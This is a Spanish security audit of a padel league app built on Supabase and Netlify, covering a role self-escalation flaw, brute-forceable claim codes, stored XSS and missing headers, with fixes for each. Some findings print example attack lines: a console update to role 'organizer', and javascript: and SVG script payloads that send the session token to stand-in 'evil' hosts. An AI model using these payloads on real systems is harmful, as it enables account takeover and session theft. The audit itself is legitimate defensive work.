# Auditoría de seguridad — Liga de pádel (2026-07-01)

## Resumen ejecutivo

La postura de seguridad del proyecto es **sólida en su diseño de base pero con un agujero crítico que invalida todo el modelo de permisos**. La arquitectura acierta en lo estructural: RLS activado en todas las tablas sensibles, vistas públicas que excluyen teléfono/correo/access_code (sin ninguna ruta anónima a PII confirmada), puntos derivados en vistas SQL, secretos correctamente manejados (solo la anon key llega al cliente, `.env` y tokens fuera de git), funciones DEFINER con `search_path` fijo, y el flujo de reclamo de cuenta blindado contra tomar la ficha de otro. Sin embargo, hay **1 vulnerabilidad crítica de escalada de privilegios** (cualquier jugador se auto-asciende a `organizer` con un solo UPDATE) que colapsa todo el resto del modelo, más **3 hallazgos high** (fuerza bruta sin límite de los 4 dígitos del teléfono y del access_code de staff → toma de cuenta), **5 medium** (evasión del tope de 5 cambios, XSS almacenado vía URLs y subida de SVG, reloj del draft, cabeceras HTTP ausentes) y varios low/info de endurecimiento.

Conteo por severidad: **Critical: 1 · High: 3 · Medium: 5 · Low: 6 · Info: 8** (tras fusionar duplicados entre dimensiones).

**Hay que arreglar antes de tener usuarios reales / antes de lanzar a prod:** el hallazgo crítico (self-update de `profiles.role`) es de corrección obligatoria — sin él, cualquier persona que reclame su ficha legítima se convierte en administrador de la liga en dos requests. Los dos oráculos de fuerza bruta (teléfono y access_code) también deben mitigarse antes del arranque, porque es precisamente en el arranque —cuando casi ninguna ficha está reclamada— cuando son más explotables.

## Hallazgos por severidad

## Critical

### [CRITICAL] Escalada de privilegios: un jugador puede auto-asignarse `role='organizer'` con un UPDATE a su propio profile
- **Dónde:** `supabase/migrations/0004_rls.sql:70-71`
- **Riesgo:** La política `profiles self update` solo verifica propiedad de la fila (`id = auth.uid()`) pero **no restringe qué columnas** puede cambiar el usuario. `profiles.role` es la única fuente de verdad de rol que leen `is_organizer()` e `is_content_manager()` (0002:44-50, 0010). Cualquier jugador autenticado, con su sesión legítima y la anon key visible en el bundle, ejecuta desde la consola del navegador:
  ```js
  supabase.from('profiles').update({ role: 'organizer' }).eq('id', <su_uid>)
  ```
  El `with check (id = auth.uid())` se cumple y el UPDATE pasa. A partir de ahí `is_organizer()` devuelve `true` y se activa la política `organizer all` en **todas** las tablas administrativas: puede editar/borrar equipos, resultados, alineaciones de cualquier equipo, publicar noticias, leer los teléfonos crudos de todo el roster (`players self read` incluye `is_organizer()`), leer `staff_members` con los `access_code` en claro, y manipular el draft. Es un compromiso total del backend desde una cuenta de jugador cualquiera. Los guards de React (`RequireRole`) no ayudan: son solo UI; la escritura va directa a Postgres vía PostgREST.
- **Fix:** Congelar las columnas sensibles en la política de UPDATE. Migración nueva:
  ```sql
  drop policy "profiles self update" on profiles;
  create policy "profiles self update" on profiles for update
    using (id = auth.uid())
    with check (
      id = auth.uid()
      and role = (select p.role from profiles p where p.id = auth.uid())
      and player_id is not distinct from (select p.player_id from profiles p where p.id = auth.uid())
      and staff_member_id is not distinct from (select p.staff_member_id from profiles p where p.id = auth.uid())
    );
  ```
  Alternativa/complemento robusto: `revoke update on profiles from authenticated, anon; grant update (full_name) on profiles to authenticated;` (solo columnas benignas), y un trigger `BEFORE UPDATE` que lance si `new.role <> old.role` y el ejecutor no es organizador. Los cambios de rol legítimos ya los hacen triggers SECURITY DEFINER (`sync_captain_role`, `handle_new_user`) que no pasan por RLS, así que no se rompe nada.

## High

### [HIGH] Fuerza bruta sin límite de los últimos 4 dígitos del teléfono → toma de cuenta de jugador
- **Dónde:** `supabase/migrations/0008_password_auth.sql:32` (RPC `verify_player_claim`) y `:88-91` (re-verificación en `handle_new_user`)
- **Riesgo:** El reclamo de cuenta compara `digits_last4(pl.phone)` con `phone_last4`: solo **10 000 combinaciones**, sin throttling, lockout ni captcha server-side. `verify_player_claim(uuid, text)` tiene `grant execute ... to anon` y actúa como oráculo (`{ok:true}` cuando acierta). El `player_id` es público (aparece en `players_public` y en el selector de login), y `player_has_account` permite enumerar qué fichas aún no tienen cuenta. Un atacante anónimo elige una víctima sin cuenta, itera de `0000` a `9999` (~5 000 intentos promedio), y al acertar crea el profile enlazado a esa ficha con **su propia contraseña**: controla la cuenta de la víctima (y su rol capitán si aplica). El índice `one_profile_per_player` solo impide reclamar una ficha *ya* reclamada, no frena el barrido previo. Especialmente grave en el arranque de la liga, cuando casi ninguna ficha está reclamada.
- **Fix:** No se resuelve solo en SQL. (a) Mover el reclamo a una Edge Function con `service_role` que aplique rate-limiting por `player_id` + IP y bloqueo temporal tras N fallos; (b) tabla `claim_attempts(player_id, ip, count, window_start)` consultada dentro de `verify_player_claim` y `handle_new_user` que rechace tras ~5 intentos en 15 min; (c) elevar la entropía combinando los 4 dígitos con otro dato no público (fecha de nacimiento). Activar además el rate limit de Auth de Supabase como capa adicional, no como única defensa. No exponer `player_has_account` como oráculo masivo a anon.

### [HIGH] Fuerza bruta / adivinación del `access_code` de staff → toma de cuenta de organizador
- **Dónde:** `supabase/migrations/0009_staff_members.sql:46` (RPC `verify_staff_claim`) y `:111-119` (`handle_new_user`, rama staff)
- **Riesgo:** Idéntico oráculo al del teléfono, pero el premio es mayor: al reclamar una ficha de staff el profile hereda directamente `st.role` (`organizer`/`web_manager`) → escalada a admin **sin siquiera necesitar cuenta previa**. `verify_staff_claim(uuid, text)` tiene `grant execute ... to anon`; `staff_public` expone `id` y `full_name` de cada staff; `staff_has_account` revela cuáles no están reclamados. `access_code` es `text` libre sin longitud ni entropía mínima (el bootstrap sugiere ejemplos triviales tipo `ELIGE-UN-CODIGO`). Un código corto o predecible cae por diccionario/fuerza bruta en minutos, y el atacante queda con `role='organizer'` y control total del backend.
  > Nota de verificación: originalmente reportado como `high` en la dimensión auth y como `critical` en definer_rpc. Se consolida en **High** dado que depende de que el código sea débil; si el `access_code` es aleatorio de alta entropía, el vector se cierra por sí solo. Por impacto (admin directo) trátese con la misma urgencia que un critical.
- **Fix:** (a) Generar `access_code` aleatorio de alta entropía (`gen_random_uuid()` o ≥16 chars), nunca elegido a mano; imponer un `CHECK` de longitud. (b) Almacenarlo **hasheado** (comparar con `crypt()`/pgcrypto) para que ni una fuga de tabla ni un organizador comprometido revelen códigos reutilizables. (c) Rate-limiting/lockout por `staff_id`/IP dentro de `verify_staff_claim` y `handle_new_user` (idealmente Edge Function). (d) Invalidar el código tras el primer uso. (e) No exponer `staff_has_account` como oráculo masivo a anon. (f) Nunca documentar códigos de ejemplo triviales.

## Medium

### [MEDIUM] El tope de "5 cambios por temporada" es evadible: el capitán escribe `lineup_entries` directo sin registrar el change_log
- **Dónde:** `supabase/migrations/0006_captain_lineups.sql:35-55` (políticas RLS de INSERT/UPDATE del capitán) y `0002_auth_and_enforcement.sql:144` (trigger `trg_change_limit` solo sobre `lineup_change_logs`)
- **Riesgo:** `enforce_change_limit` se dispara **solo** en `before insert on lineup_change_logs`, y esos logs los escribe únicamente el RPC `save_lineup` (0007). Pero 0006 concede al capitán políticas RLS directas de INSERT/UPDATE sobre `lineups` y `lineup_entries`. Un capitán puede saltarse `save_lineup` por completo y modificar las parejas vía PostgREST directo (`PATCH /rest/v1/lineup_entries?...`), sin insertar ningún log, así que el contador nunca sube y el límite deportivo queda anulado. Puede cambiar parejas ilimitadamente toda la temporada. (El lock de 1h sí resiste porque `enforce_entry_lock` está sobre la tabla `lineup_entries` directamente.)
- **Fix:** Cerrar la escritura directa. (a) Revocar el INSERT/UPDATE directo del capitán sobre `lineups`/`lineup_entries` (dejar solo SELECT) y forzar **todo** cambio por `save_lineup` (hacerla SECURITY DEFINER validando `captain_team_id()`); **y/o** (b) mover la contabilidad a un trigger `BEFORE UPDATE/INSERT on lineup_entries` que, al cambiar la pareja tras el primer envío, verifique e incremente el cupo de la temporada. Idealmente ambas: RPC como única puerta + trigger de respaldo.

### [MEDIUM] XSS almacenado vía `file_url` del reglamento en `<a href>` público (esquema `javascript:` no filtrado)
- **Dónde:** sink `src/routes/public/ReglamentoPage.tsx:28-35`; fuente `src/features/news/contentMutations.ts:94` y `src/features/news/MediaField.tsx:39-45`. Mismo patrón en `ReglamentoManagerPage.tsx:97` y `MediaField.tsx:59`.
- **Riesgo:** `MediaField` es un `<input type="url">` donde un gestor de contenido puede **pegar cualquier cadena** (no solo subir archivo). `useSaveDocument` guarda `file_url: v.file_url.trim()` sin validar esquema, y `ReglamentoPage` renderiza `<a href={doc.data.file_url} target="_blank">📄 Abrir reglamento (PDF)</a>` en una página **pública** (visible incluso a anónimos). No existe ningún helper `isSafeUrl`/`sanitize` en todo `src`. Un valor `javascript:location='https://evil/steal?c='+localStorage.getItem('sb-...-auth-token')` produce un enlace que, al hacer clic, ejecuta JS en el origen de la app y exfiltra el token de sesión de Supabase.
  > Nota de verificación: degradado de `high` a **medium** porque requiere que el atacante ya tenga permiso de escritura de contenido (gestor/organizador, o haber escalado por el hallazgo critical) para plantar el `file_url`; el disparo lo sufre cualquier visitante público.
- **Fix:** Validar el esquema de la URL **antes de guardar y antes de renderizar**. Helper `safeHref(url)` que, vía `new URL()` con try/catch, solo permita `http:`/`https:`/`mailto:` y devuelva `undefined`/`#` en otro caso; usarlo en `ReglamentoPage.tsx:29`, `ReglamentoManagerPage.tsx:97` y `MediaField.tsx:59`. En `contentMutations.ts` (useSaveDocument/useSaveNews) rechazar `file_url`/`image_url` cuyo esquema no sea http(s), idealmente restringido al host del bucket `media`. Opcional: `CHECK` en BD (`file_url ~* '^https?://'`).

### [MEDIUM] Cualquier usuario autenticado puede subir contenido activo (SVG/HTML con script) al bucket público → XSS almacenado y abuso de almacenamiento
- **Dónde:** `supabase/migrations/0013_player_self_photo.sql:8-10` (política de subida); `0010_content.sql:37-39` (bucket público sin `allowed_mime_types`/`file_size_limit`)
- **Riesgo:** El bucket `media` es público y no define restricción de MIME ni tamaño. La política de auto-foto solo comprueba `bucket_id = 'media' and (storage.foldername(name))[1] = 'players'`, sin restringir el tipo. La única validación (`accept="image/*"`) es client-side y se salta llamando `supabase.storage.from('media').upload(...)` directo con la anon key. Un jugador autenticado sube un `.svg`/`.html` con `<script>fetch('https://evil/'+localStorage.getItem('sb-...-auth-token'))</script>`, obtiene su `publicUrl` y la difunde: quien la abra directamente ejecuta el script. Sin límite de tamaño → abuso/DoS de almacenamiento.
  > Nota de verificación: degradado de `high` a **medium** porque el XSS requiere que la víctima abra la URL directa del CDN (no se ejecuta embebido en `<img>`); aun así el vector de robo de sesión y el abuso de almacenamiento son reales.
- **Fix:** Restringir el bucket en el servidor: `update storage.buckets set allowed_mime_types = array['image/png','image/jpeg','image/webp'], file_size_limit = 5242880 where id='media'` (usar bucket aparte para el PDF del reglamento, o añadir `application/pdf`). Rechazar explícitamente `image/svg+xml` y `text/html`. Servir descargas con `Content-Disposition: attachment` o re-encodear las imágenes. Validar en `set_my_photo` que la URL apunte al bucket propio.

### [MEDIUM] La subida de fotos no está ligada a la identidad; validación de tipo/tamaño solo en cliente
- **Dónde:** `supabase/migrations/0013_player_self_photo.sql:9-10`; `src/features/news/contentMutations.ts:11-26` (`uploadMedia`)
- **Riesgo:** La política de INSERT en `storage.objects` no ata el objeto al `auth.uid()` ni al `player_id`: cualquier autenticado puede escribir cualquier nombre bajo `players/`. No hay sobrescritura de objetos ajenos (el UPDATE en `media` exige `is_content_manager()`), pero sí creación ilimitada de objetos huérfanos (abuso de almacenamiento). Además `uploadMedia` deriva la extensión del **nombre del archivo** (`file.name.split('.').pop()`) sin validar MIME real ni tamaño; los `accept` son solo pistas de UI. Es la palanca que habilita el XSS por SVG del hallazgo anterior.
- **Fix:** Ligar el objeto a la identidad con convención de ruta `players/<auth.uid()>/...` y `with check (... and (storage.foldername(name))[2] = auth.uid()::text)`. Combinar con `file_size_limit` del bucket. Validar `file.type` y `file.size` en `uploadMedia` antes de subir y derivar la extensión del MIME real, no del nombre. Considerar una Edge Function con `service_role` que procese/valide la imagen.

### [MEDIUM] Ausencia total de cabeceras de seguridad HTTP en el deploy (sin CSP, X-Frame-Options, HSTS, nosniff, Referrer-Policy)
- **Dónde:** `netlify.toml:17-42`
- **Riesgo:** El `netlify.toml` solo define `Cache-Control` para el service worker y assets; no hay `Content-Security-Policy`, `X-Frame-Options` (ni CSP `frame-ancestors`), `X-Content-Type-Options: nosniff`, `Referrer-Policy` ni `Strict-Transport-Security`, y no hay `public/_headers` que los aporte. La app puede embeberse en un iframe atacante (**clickjacking** contra capitán/organizador autenticado), no hay defensa en profundidad contra XSS (una CSP frenaría el robo de JWT de los hallazgos anteriores) ni contra MIME-sniffing. En una app que guarda el JWT de Supabase en localStorage, esta capa es importante.
- **Fix:** Añadir cabeceras globales en `netlify.toml`:
  ```toml
  [[headers]]
    for = "/*"
    [headers.values]
      X-Frame-Options = "DENY"
      X-Content-Type-Options = "nosniff"
      Referrer-Policy = "strict-origin-when-cross-origin"
      Strict-Transport-Security = "max-age=63072000; includeSubDomains; preload"
      Content-Security-Policy = "default-src 'self'; connect-src 'self' https://*.supabase.co; img-src 'self' data: https:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; frame-ancestors 'none'; base-uri 'self'; object-src 'none'"
  ```
  Ajustar `connect-src` al dominio exacto del proyecto Supabase. Probar la CSP en `Report-Only` primero para no romper Google Fonts ni el service worker.

### [MEDIUM] El reloj del draft no se valida en el servidor: `make_pick` permite elegir tras vencer el `pick_deadline`
- **Dónde:** `supabase/migrations/0015_draft.sql:169-204`
- **Riesgo:** `make_pick` serializa con lock y valida turno y elegibilidad (bien), pero **no comprueba `d.pick_deadline`**. Un capitán cuyo tiempo ya venció sigue pudiendo elegir mientras `d.status = 'active'`. El deadline solo lo usa `auto_pick`, que corre disparado por clientes; si ningún cliente lo dispara a tiempo (todos cerraron la pestaña, o carrera), el capitán conserva indefinidamente su turno vencido. El reloj es efectivamente advisory, no impuesto por el servidor.
- **Fix:** En `make_pick`, tras tomar el lock: `if not is_organizer() and d.pick_deadline is not null and now() > d.pick_deadline then perform auto_pick(p_draft_id); raise exception 'Tu tiempo venció.'; end if;`. Así el servidor hace cumplir el timer sin depender de un cliente.

## Low

### [LOW] La tabla `players` no tiene protección a nivel columna: cualquier fila visible expone teléfono Y correo
- **Dónde:** `supabase/migrations/0005_fix_players_rls_recursion.sql:31` y `0001_initial_schema.sql:88-90`
- **Riesgo:** `players self read` concede SELECT de la **fila completa** a organizador, al propio jugador y al capitán (`players.team_id = captain_team_id()`). RLS de Postgres es a nivel de fila, no de columna: cuando la fila es visible lo son todas sus columnas, incluidas `phone` y `email`. Un capitán puede ejecutar `supabase.from('players').select('id,full_name,phone,email').eq('team_id', <su_team_id>)` y obtener teléfono **y correo** de todo su equipo, aunque la UI oficial nunca los muestre. No es exposición a anónimo, pero es más PII de la necesaria (el correo no hace falta para "contacto de capitán"). El propio esquema lo reconoce con un `TODO: afinar contacto`.
  > Nota de verificación: reportado como `medium` en la dimensión privacy; se consolida como **Low** porque requiere rol capitán legítimo y el vector es exposición acotada a compañeros de equipo, no a terceros ni a anónimos.
- **Fix:** Protección por columna en BD. `revoke select (email) on players from authenticated;` y `grant select (id, season_id, team_id, full_name, phone, gender, category_code, is_captain, is_active, photo_url, shirt_size) on players to authenticated;` — así ni el capitán ni el self leen `email` desde la tabla cruda. Alternativa: exponer al capitán una vista/RPC SECURITY DEFINER que devuelva `{id, full_name, phone}` sin email. Ajustar `useTeamRoster.ts` para no pedir columnas revocadas.

### [LOW] `photo_url` del jugador sin validación de esquema/host (RPC `set_my_photo` acepta cualquier texto)
- **Dónde:** `supabase/migrations/0013_player_self_photo.sql:15-25`; `src/features/teams/playerMutations.ts:89-103`; sink `src/components/ui/Avatar.tsx:27-34`
- **Riesgo:** `set_my_photo(p_url)` actualiza `players.photo_url` con `nullif(trim(p_url), '')` sin validar que sea `http(s)` ni que apunte al bucket `media`, y está `grant execute ... to authenticated`. Cualquier autenticado llama `supabase.rpc('set_my_photo', { p_url: 'https://attacker/beacon.gif?id=roster' })` saltándose el subidor. `photo_url` se pinta en `<img src>` en `players_public`: no es XSS ejecutable (los navegadores no corren `javascript:` en `src` de img), pero permite un beacon a un tercero (fuga de IP/User-Agent de cada visitante del roster) y contenido no controlado en superficie pública.
  > Nota: reportado como `medium` en injection_xss; **Low** porque no es XSS ejecutable, solo tracking/contenido no controlado.
- **Fix:** Validar en `set_my_photo`: `if p_url is not null and p_url !~* '^https://<tu-proyecto>.supabase.co/storage/v1/object/public/media/players/' then raise exception ...`. Aplicar la misma restricción al UPDATE de organizador y a `logo_url`/`image_url`. En cliente, `safeHref`/`safeSrc` antes de renderizar.

### [LOW] `logo_url` e `image_url` de equipos/noticias sin validación de esquema (CSV y formularios)
- **Dónde:** `src/features/import/teamsImport.ts:20`; `src/features/teams/teamMutations.ts:29`; `src/features/news/contentMutations.ts:46`; sinks en `TeamsPage`/`TeamRosterPage.tsx:64`/`NewsListPage.tsx:29`/`NewsDetailPage.tsx:25`/`AccountPage.tsx:102`
- **Riesgo:** `logo_url` solo tiene `z.string().trim().optional()` (a diferencia de `color`, que valida HEX, y `captain_email`, que valida EMAIL). Estas URLs terminan en `<img src>` en páginas públicas. Igual que `photo_url`: no es XSS ejecutable en `<img>`, pero permite hotlinking/beacon a terceros y es defensa en profundidad faltante frente a `javascript:`/`data:` si alguno de estos valores llegara a un `href`.
- **Fix:** Añadir a los esquemas Zod un `.refine(v => v==='' || /^https:\/\//i.test(v), 'URL inválida')`, idealmente restringido al host del bucket `media`. Centralizar en un helper `safeUrl` y aplicarlo también en el render.

### [LOW] El override de rol dev (`localStorage`) y la ruta `/dev` se sirven en producción
- **Dónde:** `src/features/auth/devRole.ts:11`; `src/routes/router.tsx:66`
- **Riesgo:** El conmutador de rol dev y la ruta `/dev` (pública, no bajo `RequireRole`) se compilan y sirven también en prod: no están gateados por `import.meta.env.DEV`. El impacto es **solo cosmético**: `AuthProvider` aplica el `devRole` únicamente al valor de UI y las queries siguen ejecutándose con la sesión real filtrada por RLS (`AuthProvider.tsx:118-119`). Forzar `dev:role='organizer'` no concede datos ni escritura ajena; el daño se limita a exponer la existencia de la consola y a una falsa sensación de acceso.
- **Fix:** Gatear `/dev` y el override tras `import.meta.env.DEV` (o una flag `VITE_` explícita) para que ni se incluyan en el bundle de prod, y/o poner `/dev` bajo `RequireRole roles=['organizer']`. Priorizar **después** de cerrar la self-update de `profiles` (es esa política la que convertiría cualquier UI de organizador en poder real).

### [LOW] Sin `force row level security` en tablas con PII
- **Dónde:** `supabase/migrations/0004_rls.sql:10-22` (`enable`, nunca `force`)
- **Riesgo:** Con solo `enable`, el **dueño** de la tabla omite RLS. No afecta a `anon`/`authenticated` (sí sujetos a RLS), pero cualquier función SECURITY DEFINER cuyo dueño sea ese rol corre sin RLS. Hoy varias funciones DEFINER dependen de eso intencionadamente, así que es defensa en profundidad, no un hueco activo. El riesgo es futuro: una función/vista mal escrita propiedad del owner filtraría teléfonos/access_codes.
  > Nota de verificación: degradado de `medium` a **Low** (confirm_votes bajo, no explotable hoy por anon/authenticated).
- **Fix:** Migración: `alter table players force row level security;` (ídem `profiles`, `staff_members`, `player_registrations`). Auditar que las funciones DEFINER que legítimamente omiten RLS lo sigan haciendo, idealmente con un rol dueño dedicado y acotado.

### [LOW] Fallos de robustez menores en enforcement (concurrencia del contador y lock con `scheduled_at` NULL)
- **Dónde:** `supabase/migrations/0002_auth_and_enforcement.sql:115-146` y `:65-72`
- **Riesgo:** (1) `enforce_change_limit` cuenta `lineup_change_logs` en un BEFORE INSERT por-fila sin lock por equipo: dos transacciones concurrentes del mismo equipo pueden leer ambas `used=4` y superar el tope de 5. (2) `enforce_lineup_lock`/`enforce_entry_lock` solo bloquean si `first_match is not null`; como `scheduled_at` es nullable, si una jornada se carga sin horario el candado de 1h nunca aplica (la regla **falla abierta** en vez de cerrada).
- **Fix:** (1) Serializar por equipo en `save_lineup` con `pg_advisory_xact_lock(hashtextextended(v_team::text,0))` antes de contar/insertar, o una tabla de cupo por `(season, team)` con `UPDATE ... RETURNING`. (2) Fallar cerrado: si `first_match is null`, rechazar la edición para no-organizadores, o exigir `scheduled_at NOT NULL` al publicar la round.

## Info (verificaciones positivas y endurecimiento menor)

Se documentan como constancia; no requieren acción de seguridad obligatoria:

- **Sin ruta anónima a PII (confirmado seguro).** `players_public` y `staff_public` excluyen `phone`/`email`/`access_code`; `player_registrations` (con teléfono en claro) no tiene SELECT para anon (solo INSERT); `staff_members` y `players` crudas restringidas por RLS. Un anónimo con la anon key no obtiene PII por ninguna ruta. — `0004_rls.sql:28-35`, `0009:28-30`, `0014:57-79`, `0012:10-14`.
- **Manejo de secretos correcto.** El cliente solo usa `VITE_SUPABASE_ANON_KEY`; sin `service_role`/`sk_`/tokens en el bundle; `.env`/`.mcp.json`/`.netlify` gitignored y no trackeados; sin sourcemaps de prod; el service worker no cachea respuestas de Supabase. — `src/lib/supabase.ts:5-6`, `.gitignore:13-20`.
- **Sin SQL injection.** Los únicos `execute format(...)` dinámicos usan `%I` (quote_ident) sobre listas de tablas hardcodeadas, sin entrada de usuario; PostgREST parametriza. — `0004_rls.sql:20,86`.
- **Sin `dangerouslySetInnerHTML`.** El cuerpo de noticias/avisos/reglamento se renderiza como texto escapado por JSX. El vector XSS real es por URLs (ver medium/low), no por render de HTML.
- **Flujo de reclamo blindado contra tomar la ficha de otro.** Re-verificación server-side en `handle_new_user` (DEFINER) + índices únicos parciales `one_profile_per_player`/`one_profile_per_staff` impiden reclamar una ficha ya reclamada o saltarse la verificación desde el cliente. — `0008:14-15`, `0009:35-36`.
- **La corrección de recursión 0005 no abre hueco de lectura de `players`.** Mueve las subconsultas a funciones DEFINER stable con `search_path` fijo sin ampliar el alcance.
- **Escritura de resultados restringida al organizador** (no hay inflado de ranking por capitanes) y **puntos derivados en vistas** (`team_standings`/`player_rankings`), sin almacenar puntos. — `0003`, `0004`, `useSaveResult`.
- **Endurecimiento menor:** `save_lineup` (INVOKER) no fija `search_path` (baja explotabilidad; añadir `set search_path = public, pg_temp` por consistencia — `0007:18`); `set_draft_order` no valida que el `team_id` pertenezca a la season del draft (solo organizador puede llamarla; validar por defensa en profundidad — `0015:87`); bucket `media` público sin URLs firmadas (aceptable mientras no se guarde contenido privado — `0010:37-43`); CSV import sin neutralización de inyección de fórmulas (irrelevante hasta que exista exportación a CSV — `parseCsv.ts:79`).

## Cobertura y puntos ciegos

**Se revisó bien (estático, con lectura del código):** las 17 migraciones SQL (esquema, RLS, funciones DEFINER, triggers de enforcement, storage, draft); el flujo de auth completo (`playerAuth.ts`, `staffAuth.ts`, `AuthProvider.tsx`, `guards.tsx`, `LoginPage.tsx`); las queries del frontend que tocan `players`/`profiles`/`staff`/registros; el manejo de secretos en todo `src/**`, `vite.config.ts`, `index.html`, `netlify.toml`, `.env.example`, `.gitignore`; el renderizado de contenido y los importadores CSV; y la configuración de Storage en las migraciones.

**No se pudo verificar desde el código** (requiere el proyecto vivo de Supabase/Netlify). Una auditoría estática no alcanza la **configuración en ejecución**, así que el usuario debe confirmar manualmente:

1. **Supabase Auth → "Confirm email" está OFF** pero que eso no relaje otras protecciones; y que el **rate limit de Auth** (signups por IP/hora) esté activado — es hoy la única fricción real frente a la fuerza bruta de reclamo hasta que se implemente el throttling propio.
2. **Supabase → Storage:** que el bucket `media` tenga realmente aplicados `allowed_mime_types` y `file_size_limit` (la migración no los define; hay que ponerlos), y confirmar si el CDN sirve SVG con `Content-Type` ejecutable.
3. **Supabase → JWT expiry / refresh token rotation:** que el tiempo de vida del JWT sea razonable (una toma de sesión por XSS dura lo que dure el token).
4. **Supabase → API settings / CORS:** que los orígenes permitidos se limiten al dominio de producción de Netlify.
5. **Supabase → RLS aplicado en el proyecto real:** las políticas viven en migraciones, pero conviene confirmar en el Dashboard que `db push` las aplicó todas y que ninguna tabla quedó sin RLS por un push parcial.
6. **Dueño de las tablas y funciones DEFINER:** confirmar bajo qué rol corren las migraciones (para el hallazgo de `force row level security`) e idealmente usar un rol dueño dedicado.
7. **Netlify → cabeceras efectivamente servidas:** tras añadir el bloque `[[headers]]`, verificar con `curl -I` que la CSP y `X-Frame-Options` llegan en la respuesta real.
8. **Escáner de historial git** (p. ej. `gitleaks`) antes de hacer público el repo, para confirmar que ningún commit anterior filtró `.env` o el token de Netlify.

## Plan de remediación priorizado

1. **[CRITICAL] Cerrar la self-update de `profiles.role`** con la política restringida por columna (+ revoke UPDATE / trigger de respaldo). Es rápido, es una migración, y desbloquea la seguridad de todo lo demás. **Hacer primero, hoy.**
2. **[HIGH] Endurecer el `access_code` de staff:** regenerarlo aleatorio de alta entropía y hashearlo (pgcrypto). Rápido y elimina la ruta anónima→admin más directa.
3. **[HIGH] Throttling server-side del reclamo** (teléfono y access_code): tabla `claim_attempts` consultada en `verify_player_claim`/`verify_staff_claim`/`handle_new_user`, con lockout tras N fallos; idealmente moverlo a una Edge Function con `service_role` y rate-limit por IP. Dejar de conceder `player_has_account`/`staff_has_account` como oráculo masivo a anon.
4. **[MEDIUM] Restringir el bucket `media`** con `allowed_mime_types` + `file_size_limit`, rechazar `svg+xml`/`text/html`, y validar MIME/tamaño real en `uploadMedia`. Ligar la ruta de subida a `auth.uid()`.
5. **[MEDIUM] Añadir el helper `safeHref`/`safeUrl`** y aplicarlo en `ReglamentoPage`, `ReglamentoManagerPage`, `MediaField` y en los `save` de `contentMutations`; validar esquema `http(s)` antes de guardar `file_url`/`image_url`/`logo_url`/`photo_url`.
6. **[MEDIUM] Añadir las cabeceras de seguridad HTTP** en `netlify.toml` (CSP en Report-Only primero, luego enforce).
7. **[MEDIUM] Cerrar la evasión del tope de 5 cambios:** revocar el INSERT/UPDATE directo del capitán sobre `lineups`/`lineup_entries` y forzar todo por `save_lineup` (DEFINER), o añadir el trigger de conteo sobre `lineup_entries`.
8. **[MEDIUM] Validar `pick_deadline` en `make_pick`** (auto_pick + excepción cuando el turno está vencido).
9. **[LOW] Protección por columna en `players`** (`revoke select (email)`) y fallar cerrado en el lock de 1h cuando `scheduled_at is null`; serializar el contador de cambios por equipo.
10. **[LOW/INFO] Higiene:** gatear `/dev` tras `import.meta.env.DEV`, añadir `force row level security` a las tablas con PII, fijar `search_path` en `save_lineup`, validar season en `set_draft_order`, y ejecutar `gitleaks` sobre el historial antes de hacer público el repo.
